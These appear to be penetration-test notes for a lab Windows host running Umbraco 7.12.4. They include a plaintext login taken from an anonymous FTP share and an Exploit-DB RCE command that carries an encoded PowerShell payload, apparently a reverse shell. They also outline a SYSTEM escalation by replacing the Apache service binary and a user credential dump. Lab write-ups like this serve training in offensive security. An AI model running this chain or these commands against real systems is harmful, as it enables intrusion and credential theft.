### ++ Approach ++
#### Credentials
	* mark@relia.com:OathDeeplyReprieve91 (umbraco login)

#### Services
	##### 80 HTTP
        Just informational pdfs

	##### 443 HTTPS
        -

	##### 14080 HTTP
        Umbraco 7.12.4 webapp
    
    ##### 139,445 SMB
        -

    ##### 135,49664-69 RPC
        -

    ##### 3389 RDP
        -

    ##### 5985,47001 WinRM
        -

    ##### 14020 FileZilla
        Found pdf for installing Umbraco 7, here we found mark creds and domain web02.relia.com so we added it to hosts file

### ++ Vulnerabilities ++

#### Vuln 1: Sensitive files in FTP server ++
	* In port 14020 we found a null session for FTP with creds and sensitive information for webapp hosted in port 14080

#### Vuln 2: RCE in Umbraco webapp (Port 14080) ++
	* https://www.exploit-db.com/exploits/49488
    * Command: python3 49488.py -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -i http://web02.relia.com:14080 -c 'cmd.exe' -a '/c powershell -e JABjAGwAa...'

#### Vuln 3: Apache2.4 with misconfigured permissions ++
	* Low-privileged user can abuse Apache2.4 service by placing a payload in C:\xampp\apache\bin\httpd.exe and restarting the service

### ++ System Interaction ++
#### Foothold  
	* Follow vulnerabilities 1 and 2

#### Privilege Escalation 
	* Abuse service Apache2.4 and get nt authority\system

#### Attack chain
	* Follow vulnerabilities 1 and 2
    * Abuse service Apache2.4 and get nt authority\system
	
#### Post-exploitation 
	* Dump mark and zachary users